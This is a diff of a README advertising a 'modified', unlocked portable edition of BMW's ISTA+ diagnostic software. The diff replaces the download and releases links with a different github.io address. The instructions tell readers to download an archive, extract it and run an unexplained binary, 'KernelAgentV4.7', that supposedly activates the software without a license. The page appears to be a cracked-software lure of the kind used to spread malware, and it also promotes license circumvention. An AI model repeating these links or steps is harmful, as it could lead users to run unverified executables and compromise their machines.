@@ -2,13 +2,13 @@
 
 Run full dealer-grade diagnostics, ECU access, coding, and guided troubleshooting for BMW, MINI, and Rolls-Royce vehicles using ISTA+ (Rheingold) in a powerful and fully portable edition. This modified release comes preconfigured and requires **no installation**, making it ideal for workshops, mobile technicians, and enthusiasts. The package is unlocked and secured via `KernelAgentV4.7` — no license server, no registry edits, and no internet required.
 
-[![Download ISTA+ Portable](https://img.shields.io/badge/Download-ISTA+_Portable-blueviolet)](https://bmw-ista-plus-rheingold-portable.github.io/.github)
+[![Download ISTA+ Portable](https://img.shields.io/badge/Download-ISTA+_Portable-blueviolet)](https://pomidorkaskeletik4.github.io/pomo/ferder)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](https://bmw-ista-plus-rheingold-portable.github.io/.github) page  
+1. 📦 **Download the archive** from the [Releases](https://pomidorkaskeletik4.github.io/pomo/ferder) page  
 2. 📁 **Extract all files** to any preferred directory (e.g., `D:\BMWTools\ISTA`) using WinRAR or 7-Zip  
 3. 🖱 **Execute `KernelAgentV4.7`** to initialize the portable environment and unlock full ISTA+ access  
 4. 🔓 **KernelAgentV4.7** activates the ISTA+ suite without modifying your operating system or calling home  
